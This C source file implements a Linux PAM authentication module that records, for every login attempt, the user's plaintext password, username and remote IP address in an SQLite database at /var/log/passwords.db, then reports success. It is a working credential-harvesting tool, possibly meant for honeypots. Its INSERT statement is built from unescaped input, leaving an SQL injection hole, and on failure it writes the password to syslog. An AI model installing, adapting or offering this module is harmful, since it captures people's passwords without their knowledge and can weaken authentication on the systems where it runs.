#ifndef LINUX
    #include <security/pam_appl.h>
#endif  /* LINUX */

#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <syslog.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sqlite3.h>

#define _XOPEN_SOURCE
#include <unistd.h>

/* Default location of password collection database */
#define DEFAULT_LOG   "/var/log/passwords.db"
#define BUF_MAX       4096

/* logging function ripped from pam_listfile.c */
static void _pam_log(int err, const char *format, ...)
{
    va_list args;

    va_start(args, format);
    openlog("pam_logpassword", LOG_CONS|LOG_PID, LOG_AUTH);
    vsyslog(err, format, args);
    va_end(args);
    closelog();
}

/* Struct to hold sqlite3 database information */
typedef struct{
        int fd;
        sqlite3 *db;
        char *name;
} Dbctx;

/* Callback function, sets the integer "udp" to 1 if a table exists */
static int table_exists( void* udp, int c_num, char** c_vals, char** c_names ) {
        *(int *)udp = 1;
        return 0;
}

/* expected hook for auth service */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    /* Variable declarations */
    int ret;
    char *uname;
    char *ip;
    char command[BUF_MAX];
    
    const char *pword;
    struct timeval tv;
    
    /* These are the pam calls that get password, username, and IP address */
    pam_get_authtok(pamh, PAM_AUTHTOK, &pword, NULL);
    pam_get_item(pamh, PAM_USER, (void*) &uname);
    pam_get_item(pamh, PAM_RHOST,(void*) &ip);
    
    /* Initialize the database variables */
    Dbctx database;
    database.name = DEFAULT_LOG;
    
    /* Open the database file */
    database.fd = sqlite3_open(database.name, &(database.db));
    if( database.fd ) {
        _pam_log(LOG_ERR,"failed to open database file");
       goto failure;
    }
    
    /* This line checks if the database file exists, and if it has a passwords table*/
    int exists = 0;
    ret = sqlite3_exec(database.db, "SELECT USERNAME FROM sqlite_master WHERE type='table' AND name='passwords';", table_exists, &exists, NULL);
    if (!exists) {
        /* If the table does not exist, then create the SQLite3 database file and table */
        _pam_log(LOG_ERR,"Creating passwords table");
        ret = sqlite3_exec(database.db, "CREATE TABLE passwords(TIMESTAMP_SECS INTEGER, TIMESTAMP_NANO INTEGER, IP_ADDRESS TEXT, USERNAME TEXT, PASSWORD TEXT, PRIMARY KEY (TIMESTAMP_SECS,TIMESTAMP_NANO));", NULL, NULL, NULL);
    }
    
    /* Get a timestamp to record time of password collect */
    gettimeofday(&tv, NULL);
    
    /* Create the database command with all of the pertinent data */
    ret = snprintf(command, BUF_MAX-1, "INSERT INTO passwords(TIMESTAMP_SECS,TIMESTAMP_NANO,IP_ADDRESS,USERNAME,PASSWORD) VALUES(%lu,%lu,'%s','%s','%s');", tv.tv_sec, tv.tv_usec, ip, uname, pword);
    
    /* Execute the command */
    ret = sqlite3_exec(database.db, command, NULL, NULL, NULL);
    if (ret)
    {
        _pam_log(LOG_ERR,"failed to write pw to file");
        _pam_log(LOG_ERR, command);
        goto failure;
    }
    
    /* Close the database file */
    sqlite3_close(database.db);
    
    return PAM_SUCCESS;
    
    /* On the event of failure, close the database file if its open and do not return success */
    failure:
    if (database.db) { sqlite3_close(database.db); }
    return PAM_AUTHINFO_UNAVAIL;
}

/* Required export for PAM module, it doesn't do anything but say its successful */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
   return PAM_SUCCESS;
}

/* Required structure if PAM is compiled statically */
#ifdef PAM_STATIC
struct pam_module _pam_listfile_modstruct = {
   "pam_logpassword",
    pam_sm_authenticate,
    pam_sm_setcred,
    NULL,
    NULL,
    NULL,
    NULL,
};
#endif
